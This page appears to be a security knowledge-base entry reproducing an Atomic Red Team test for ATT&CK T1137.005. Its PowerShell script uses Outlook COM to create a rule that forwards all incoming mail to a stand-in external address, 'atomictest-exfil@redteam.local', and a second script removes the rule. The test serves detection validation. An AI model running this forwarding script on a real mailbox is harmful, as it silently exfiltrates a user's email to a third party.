---
atomic_guid: "b0bd3d76-a57c-4699-83f4-8cd798dd09bd"
title: "Outlook Rule - Auto-Forward Emails to External Address via COM Object"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.005"
attack_technique_name: "Office Application Startup: Outlook Rules"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.005/T1137.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "b0bd3d76-a57c-4699-83f4-8cd798dd09bd"
  - "Outlook Rule - Auto-Forward Emails to External Address via COM Object"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Outlook Rule - Auto-Forward Emails to External Address via COM Object

Creates an Outlook rule that automatically forwards all received emails to
an external address. Simulates Business Email Compromise (BEC) and insider
threat scenarios where adversaries establish forwarding rules to exfiltrate
mail. One of the most commonly observed real-world abuses of Outlook rules.
Detected by Exchange mail flow anomalies and Microsoft Secure Score
forwarding alerts.
NOTE: No actual email is forwarded during this test - the rule is created
but a trigger email is not sent. Run cleanup immediately after verification.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.

## Metadata

- Atomic GUID: b0bd3d76-a57c-4699-83f4-8cd798dd09bd
- Technique: T1137.005: Office Application Startup: Outlook Rules
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1137.005/T1137.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup|T1137.005]]

## Input Arguments

### forward_to_address

- description: Email address to forward mail to (use a controlled test address)
- type: string
- default: atomictest-exfil@redteam.local

### rule_name

- description: Name for the forwarding rule
- type: string
- default: AtomicTest_T1137005_ForwardExfil

## Dependencies

Classic Outlook must be installed (required for COM automation)

### Prerequisite Check

```untitled
$clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
if ($clsid) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```untitled
Write-Host "[-] Classic Outlook is not installed or COM is not registered."
Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
exit 1
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}

$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$rule      = $rules.Create("#{rule_name}", 0)

$action = $rule.Actions.Forward
$action.Enabled = $true
$action.Recipients.Add("#{forward_to_address}")
$action.Recipients.ResolveAll() | Out-Null

$rule.Enabled = $true
$rules.Save()
Write-Host "[+] Auto-forward rule '#{rule_name}' created -> #{forward_to_address}"
Write-Host "[!] Run cleanup immediately after verifying rule creation in Outlook."
```

### Cleanup

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
    exit 1
}
$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$removed   = $false
for ($i = $rules.Count; $i -ge 1; $i--) {
    if ($rules.Item($i).Name -eq "#{rule_name}") {
        $rules.Remove($rules.Item($i).Name)
        $removed = $true
    }
}
if ($removed) {
    $rules.Save()
    Write-Host "[+] All instances of forwarding rule '#{rule_name}' removed."
} else {
    Write-Host "[*] Rule '#{rule_name}' not found - already removed."
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.005/T1137.005.yaml)
